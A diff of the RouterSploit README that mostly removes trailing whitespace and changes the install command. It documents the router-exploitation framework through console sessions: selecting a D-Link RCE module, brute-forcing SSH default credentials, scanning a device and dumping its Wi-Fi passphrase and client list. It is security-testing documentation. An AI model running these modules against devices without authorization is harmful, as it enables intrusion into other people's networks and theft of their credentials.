@@ -11,12 +11,12 @@ It consists of various modules that aids penetration testing operations:
 # Installation
 
 	sudo apt-get install python-requests python-paramiko python-netsnmp
-	git clone https://github.com/reverse-shell/routersploit
+    pip install git+https://github.com/reverse-shell/routersploit.git
 	./rsf.py
 
 # Usage
 
-	root@kalidev:~/git/routersploit# ./rsf.py 
+	root@kalidev:~/git/routersploit# ./rsf.py
 	 ______            _            _____       _       _ _
 	 | ___ \          | |          /  ___|     | |     (_) |
 	 | |_/ /___  _   _| |_ ___ _ __\ `--. _ __ | | ___  _| |_
@@ -30,7 +30,7 @@ It consists of various modules that aids penetration testing operations:
 	 Codename : Wildest Dreams
 	 Version  : 1.0.0
 
-	rsf > 
+	rsf >
 
 ## 1. Exploits
 
@@ -39,7 +39,7 @@ It consists of various modules that aids penetration testing operations:
 	rsf > use exploits/
 	exploits/2wire/     exploits/asmax/     exploits/asus/      exploits/cisco/     exploits/dlink/     exploits/fortinet/  exploits/juniper/   exploits/linksys/   exploits/multi/     exploits/netgear/
 	rsf > use exploits/dlink/dir_300_600_rce
-	rsf (D-LINK DIR-300 & DIR-600 RCE) > 
+	rsf (D-LINK DIR-300 & DIR-600 RCE) >
 
 U can use tab key for completion.
 
@@ -52,9 +52,9 @@ Display module options:
 	Target options:
 
 
-	   Name       Current settings     Description                                
-	   ----       ----------------     -----------                                
-	   target                          Target address e.g. http://192.168.1.1     
+	   Name       Current settings     Description
+	   ----       ----------------     -----------
+	   target                          Target address e.g. http://192.168.1.1
 	   port       80                   Target Port
 
 Set options:
@@ -119,34 +119,34 @@ Following services are currently supported:
 
 Every service has been divided into two modules:
 
-- default (e.g. ssh_default) - this kind of modules use one wordlist with default credentials pairs login:password. Module can be quickly used and in matter of seconds verify if the device uses default credentials.  
+- default (e.g. ssh_default) - this kind of modules use one wordlist with default credentials pairs login:password. Module can be quickly used and in matter of seconds verify if the device uses default credentials.
 - bruteforce (e.g. ssh_bruteforce) - this kind of modules perform dictionary attacks against specified account or list of accounts. It takes two parameters login and password. These values can be a single word (e.g. 'admin') or entire list of strings (file:///root/users.txt).
 
 Console:
 
     rsf > use creds/
-    creds/ftp_bruteforce         creds/http_basic_bruteforce  creds/http_form_bruteforce   creds/snmp_bruteforce        creds/ssh_default            creds/telnet_default         
-    creds/ftp_default            creds/http_basic_default     creds/http_form_default      creds/ssh_bruteforce         creds/telnet_bruteforce      
+    creds/ftp_bruteforce         creds/http_basic_bruteforce  creds/http_form_bruteforce   creds/snmp_bruteforce        creds/ssh_default            creds/telnet_default
+    creds/ftp_default            creds/http_basic_default     creds/http_form_default      creds/ssh_bruteforce         creds/telnet_bruteforce
     rsf > use creds/ssh_default
-    rsf (SSH Default Creds) > 
+    rsf (SSH Default Creds) >
 
 ### Options
 
     rsf (SSH Default Creds) > show options
-    
+
     Target options:
-    
-       Name       Current settings     Description           
-       ----       ----------------     -----------           
-       target                          Target IP address     
-       port       22                   Target port           
-    
-    
+
+       Name       Current settings     Description
+       ----       ----------------     -----------
+       target                          Target IP address
+       port       22                   Target port
+
+
     Module options:
-    
-       Name         Current settings                                                      Description                                              
-       ----         ----------------                                                      -----------                                              
-       threads      8                                                                     Numbers of threads                                       
+
+       Name         Current settings                                                      Description
+       ----         ----------------                                                      -----------
+       threads      8                                                                     Numbers of threads
        defaults     file:///root/git/routersploit/routersploit/wordlists/defaults.txt     User:Pass or file with default credentials (file://)
 
 
@@ -174,18 +174,18 @@ Set target:
     [-] worker-7 Authentication failed. Username: 'ADVMAIL' Password: 'HP'
     [-] worker-3 Authentication failed. Username: '266344' Password: '266344'
     [-] worker-2 Authentication failed. Username: '1502' Password: '1502'
-	
+
     (..)
 
     Elapsed time:  38.9181981087 seconds
     [+] Credentials found!
-	
-    Login     Password     
-    -----     --------     
-    admin     1234         
 
-    rsf (SSH Default Creds) > 
-	
+    Login     Password
+    -----     --------
+    admin     1234
+
+    rsf (SSH Default Creds) >
+
 ## 3. Scanners
 
 Scanners allow quickly verify if the target is vulnerable to any exploits.
@@ -199,11 +199,11 @@ Scanners allow quickly verify if the target is vulnerable to any exploits.
 ### Options
 
     Target options:
-    
-       Name       Current settings     Description                                
-       ----       ----------------     -----------                                
-       target                          Target address e.g. http://192.168.1.1     
-       port       80                   Target port                                
+
+       Name       Current settings     Description
+       ----       ----------------     -----------
+       target                          Target address e.g. http://192.168.1.1
+       port       80                   Target port
 
 Set target:
 
@@ -220,7 +220,7 @@ Set target:
     [-] exploits/dlink/dir_645_password_disclosure is not vulnerable
     [-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable
     [-] exploits/dlink/dir_300_600_rce is not vulnerable
-    
+
     [+] Device is vulnerable!
      - exploits/dlink/dwr_932_info_disclosure
 
@@ -233,20 +233,20 @@ It has been verified that target is vulnerable to dwr\_932\_info\_disclosure exp
     [*] Running module...
     [*] Decoding JSON value
     [+] Exploit success
-    
-       Parameter                  Value                                                                                                 
-       ---------                  -----                                                                                                 
-       get_wps_enable             0                                                                                                     
-       wifi_AP1_enable            1                                                                                                     
-       get_client_list            9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0     
-       wifi_AP1_ssid              dlink-DWR-932                                                                                         
-       get_mac_address            c4:00:f5:00:ec:40                                                                                     
-       wifi_AP1_security_mode     3208,8                                                                                                
-       wifi_AP1_hidden            0                                                                                                     
-       get_mac_filter_switch      0                                                                                                     
-       wifi_AP1_passphrase        MyPaSsPhRaSe                                                                                          
+
+       Parameter                  Value
+       ---------                  -----
+       get_wps_enable             0
+       wifi_AP1_enable            1
+       get_client_list            9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0
+       wifi_AP1_ssid              dlink-DWR-932
+       get_mac_address            c4:00:f5:00:ec:40
+       wifi_AP1_security_mode     3208,8
+       wifi_AP1_hidden            0
+       get_mac_filter_switch      0
+       wifi_AP1_passphrase        MyPaSsPhRaSe
        get_wps_mode               0
-    
+
 # License
 
 License has been taken from BSD licensing and applied to RouterSploit Framework.
